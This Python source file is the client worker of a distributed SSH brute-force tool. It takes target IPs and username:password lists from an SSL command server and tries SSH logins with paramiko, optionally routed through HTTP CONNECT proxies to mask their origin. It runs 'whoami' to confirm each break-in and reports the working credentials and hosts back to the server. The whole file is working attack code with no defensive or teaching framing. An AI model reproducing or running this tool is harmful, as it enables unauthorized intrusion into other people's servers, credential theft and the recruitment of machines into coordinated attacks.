from twisted.internet import ssl, task, protocol, endpoints, defer
from twisted.python.modules import getModule
from twisted.internet.protocol import ClientFactory
from twisted.protocols.basic import LineReceiver
from twisted.internet import reactor
import sys
import random
import paramiko 
import threading
import time
import json
import argparse
import socket
results=[]
clientid=str(random.randrange(0, 100000000, 1))
status=''
next_proxy=0
gproxy=''
gport=0
def foo(lproxy,lproxyport,ldestination,ldestport):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    #print lproxy," ",lproxyport
    try:
        s.connect((lproxy,int(lproxyport)))
        s.sendall("CONNECT %s:%s HTTP/1.1\r\n\r\n" % (ldestination,ldestport))	#connects to proxy
    except:
        return 'failed'
    response=''
    try:
        while True:
            chunk=s.recv(1024)
            if not chunk:
                break
            response=response+chunk
            if "\r\n\r\n" in chunk:
                break
    except socket.error, se:
        #print 'sexcept'
        return 'failed'
    #print response
    if not "200 OK" in response:
        #print "-200 NOT OK"
        return 'failed'
    #else :
        #print "-200 OK"
    return s


def sshbrute(IP,uname,pword,sock=None):
    global results
    global gproxy
    global gport
    IP=IP.strip('\n').strip('\r').strip(' ')
    uname=uname.strip('\n').strip('\r').strip(' ')
    pword=pword.strip('\n').strip('\r').strip(' ')
    def attempt(IP,uname,pword):        
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        paramiko.util.log_to_file("filename.log")
        if next_proxy==1:
            print 'Trying with: '+uname+' '+pword+' on '+IP+' with proxy '+gproxy #attempts to ssh
            s=foo(gproxy,gport,IP,'22')             #via a proxy
            if s=='failed':
                return 0
        else:
            print 'Trying with: '+uname+' '+pword+' on '+IP+' without proxy'    #or without a proxy
            s=None
        try:
            ssh.connect(IP, username=uname, password=pword,sock=s)
        except Exception as e:
            #print 'fexcept'
            pass
        try:
            ssh.exec_command("whoami",timeout=2)                #try to execute 2 commands to see if we really are connected
            ssh.exec_command("logout",timeout=2)
        except Exception as e:
            #print 'except'
            #print e
            #return 0
            pass
        else:
            print "---Success: "+uname+' '+pword+' on '+IP      #we found a match
            results.append(str(uname+':'+pword+':'+IP))
        ssh.close()
        return 1
    #t=threading.Thread(target=attempt,args=(IP,uname,pword))       #this can be run as different threads although I have not tested it completely
    #t.start()
    att=attempt(IP,uname,pword)
    if att==0:
        return 0
    #time.sleep(1)
    return 1

def fill_ips(next_part):
    ips=open('ips.txt','a') #we receive all the target ips when the program starts, so we receive them in parts until we have all of them.
    ips.write(next_part)
    ips.close()
class Client(LineReceiver):
    buffer = ""     #we use a buffer so because the ssl protocol triggers the receive function in parts

    def connectionMade(self):
        global status
        data={'command':'hello','client_id':clientid}   #if connection is successful, greet the server
        self.sendLine(json.dumps(data))
        print "send"
        f=open('credentials.txt','w')
        h=open('ips.txt','w')
        f.close()
        h.close()
        status='online'

    def dataReceived(self, dat):
        global status
        global results
        global next_proxy
        global gproxy
        global gport
        global lastcommand
        self.buffer += dat
        try:
            data=json.loads(self.buffer)
        except ValueError:
            return
        self.buffer = ""
        if data['command']=='ips':
            fill_ips(data[data['command']]) #if the server has sent target ip addresses, call the fill_ips() method to create the target ips file 
            del data[data['command']]
        
        elif data['command']=='end':
            if status=='ready':
                return
            data['command']='ready'
            status='ready'
            self.sendLine(json.dumps(data))
            print "Done with all"
            # Received everything. Ready to go
        elif data['command']=='execute':    
            fil=open('ips.txt','r')
            ips=[]
            for each in fil:    
                ips.append(each)    #load ips to memory
            creds=data[data['command']]
            del data['execute']
            flag=1
            for each in creds:
                username,password=each.split(':')
                for ip in ips:
                    if data['proxy']!='none':
                        load=data['proxy']
                        gproxy,gport=load.split(':')    #splits proxy address and port
                        next_proxy=1        #mark to use proxy
                    else:
                        groxy=''
                        gport=0
                        next_proxy=0        #no proxy here
                        #sock=None
                    if(sshbrute(ip,username,password)==0):                
                        print '---Proxy Failed! Will retry with different proxy'    #if sshbrute() returns 0 it means there was an error somewhere. so we flag it, and send an error to server
                        flag=0 
            status='execute'
            fil.close()
            if flag==0:
                data['command']='error' #in case there was an error
                data[data['command']]=creds
                print '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
            else:
                data['command']='finished'
                data[data['command']]=results
            if data['proxy']=='none':
                data['proxy']='yes'
            self.sendLine(json.dumps(data))
        elif data['command']=='wait':
            if status!='ready':
                slp=data[data['command']]   #set a waiting time period after each group of attempts
                data['command']='ready'
                status='waiting'
                print "Sleeping for "+str(slp)
                print "=============================================================================="
                self.sendLine(json.dumps(data))
                time.sleep(slp)
            status='ready'
            return
        elif data['command']=='terminate':
            self.transport.loseConnection()
            #sys.exit()     

class EchoClientFactory(ClientFactory):
    protocol = Client

    def clientConnectionFailed(self, connector, reason):
        print 'connection failed:', reason.getErrorMessage()
        reactor.stop()

    def clientConnectionLost(self, connector, reason):
        print 'connection lost:', reason.getErrorMessage()
        reactor.stop()

def main():
    vernum='1.0'
    parser = argparse.ArgumentParser(description='client version ' + vernum)
    parser.add_argument('-p', dest='port', action='store', default=46001)
    parser.add_argument('-s', dest='servip', action='store', default='0.0.0.0')
    args=parser.parse_args()
    factory = EchoClientFactory()
    reactor.connectSSL(args.servip, int(args.port), factory,ssl.ClientContextFactory())
    reactor.run()    

if __name__ == '__main__':
    main()
